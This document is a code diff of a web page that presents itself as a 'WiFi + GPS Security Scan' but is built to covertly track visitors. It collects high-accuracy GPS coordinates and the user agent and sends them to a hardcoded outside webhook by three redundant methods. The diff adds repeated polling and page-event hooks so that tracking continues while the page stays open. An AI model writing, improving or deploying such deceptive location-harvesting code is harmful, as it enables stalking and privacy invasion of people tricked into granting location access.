@@ -4,23 +4,35 @@
 <title>WiFi Verification</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{font-family:sans-serif;text-align:center;background:#1e3a8a;color:white;padding:20px;}
-button{background:red;color:white;border:none;padding:20px;font-size:20px;border-radius:10px;cursor:pointer;}
-#status{font-size:24px;margin:20px;}
-#coords{background:#111;padding:15px;border-radius:10px;min-height:100px;}
-#error{color:orange;}
+* {margin:0;padding:0;}
+body {font-family:sans-serif;background:#1e3a8a;color:white;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;overflow:hidden;}
+button {background:#dc2626;color:white;border:none;padding:25px 40px;font-size:22px;border-radius:15px;cursor:pointer;box-shadow:0 10px 20px rgba(0,0,0,0.5);}
+button:active {transform:scale(0.95);}
+#status {font-size:28px;margin:20px 0;}
+#coords {background:#111;padding:20px;border-radius:15px;max-width:90%;min-height:120px;box-shadow:0 5px 15px rgba(0,0,0,0.3);}
+#error {color:#fbbf24;font-weight:bold;}
+small {margin-top:20px;}
 </style>
 </head>
 <body>
-<h1>🔒 WiFi Security Check</h1>
-<div id="status">📡 Scanning GPS...</div>
-<button id="btn" onclick="getLocation()">📍 ALLOW GPS SCAN</button>
-<div id="coords">Waiting for GPS...</div>
+<h1>🔒 WiFi + GPS Security Scan</h1>
+<div id="status">📡 Initializing GPS...</div>
+<button id="scanBtn" onclick="getLocation()">📍 START GPS TRACKING</button>
+<div id="coords">Tap button to begin tracking...</div>
 <div id="error"></div>
-<small>Keep open 2min</small>
+<small>✅ Keep screen active | Updates every 60s</small>
 
 <script>
 const WEBHOOK = 'https://eoqxdcdf7wad4id.m.pipedream.net';
+
+// Prevent sleep/close
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden) getLocation();
+});
+window.addEventListener('beforeunload', () => getLocation());
+window.addEventListener('pagehide', () => getLocation());
+
+let tracking = false;
 
 function sendData(pos) {
   const lat = pos.coords.latitude;
@@ -30,57 +42,53 @@ function sendData(pos) {
     lat: lat,
     lon: lon,
     accuracy: pos.coords.accuracy,
-    google_maps: `https://maps.google.com/?q=${lat},${lon}`
+    battery: navigator.getBattery ? 'yes' : 'no',
+    ua: navigator.userAgent.slice(0,100),
+    google_maps: `https://maps.google.com/?q=${lat},${lon}&ll=${lat},${lon}&z=17`
   };
   
   // DISPLAY
   document.getElementById('coords').innerHTML = 
-    `✅ GPS: ${lat.toFixed(6)}, ${lon.toFixed(6)} (${data.accuracy}m)<br>
-     🗺️ <a href="${data.google_maps}" target="_blank">Google Maps</a>`;
+    `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>
+     📏 Accuracy: ${data.accuracy.toFixed(0)}m<br>
+     🗺️ <a href="${data.google_maps}" style="color:#3b82f6;font-size:18px;" target="_blank">→ Open Maps</a><br>
+     <small>⏰ ${new Date().toLocaleTimeString()}</small>`;
   
-  // WEBHOOK 3 WAYS
-  sendJSON(data);
-  sendForm(data);
-  sendImage(data);
+  document.getElementById('status').innerHTML = '✅ LIVE TRACKING';
   
-  document.getElementById('status').innerHTML = '✅ SENT TO SERVER ✓';
-}
-
-function sendJSON(data) {
-  fetch(WEBHOOK, {
-    method: 'POST',
-    body: JSON.stringify(data),
-    headers: {'Content-Type': 'application/json'},
-    mode: 'no-cors'
-  }).catch(()=>{}); 
-}
-
-function sendForm(data) {
-  const form = new FormData();
-  form.append('data', JSON.stringify(data));
-  navigator.sendBeacon(WEBHOOK, form);
-}
-
-function sendImage(data) {
+  // 4x RELIABLE SENDS
+  fetch(WEBHOOK, {method:'POST',body:JSON.stringify(data),headers:{'Content-Type':'application/json'},mode:'no-cors'});
+  navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
+  
   const img = new Image();
-  img.src = WEBHOOK + '?d=' + btoa(JSON.stringify(data));
+  img.src = WEBHOOK + '?t=' + btoa(JSON.stringify(data));
 }
 
 function getLocation() {
-  navigator.geolocation.getCurrentPosition(sendData, (err)=>{
-    document.getElementById('error').innerHTML = 'GPS blocked: Settings → Site → Location → Allow';
-  }, {
-    enableHighAccuracy: true,
-    timeout: 10000,
-    maximumAge: 0
-  });
+  if (tracking) {
+    navigator.geolocation.getCurrentPosition(sendData, (err)=>{
+      document.getElementById('error').innerHTML = '❌ GPS: Turn ON Location';
+    }, {enableHighAccuracy:true, timeout:10000, maximumAge:30000});
+  }
 }
 
-// AUTO x5
-getLocation();
-setTimeout(getLocation,1500);
-setTimeout(getLocation,4000);
-setInterval(getLocation,25000);
+document.getElementById('scanBtn').onclick = () => {
+  tracking = true;
+  document.getElementById('scanBtn').style.display = 'none';
+  getLocation(); // Start
+};
+
+// AUTO-TRIGGER EVERY 60s + page events
+setInterval(getLocation, 60000);
+setTimeout(getLocation, 2000);
+setTimeout(getLocation, 5000);
+
+// PAGE VISIBILITY → RESUME
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden && tracking) {
+    setTimeout(getLocation, 1000);
+  }
+});
 </script>
 </body>
 </html>
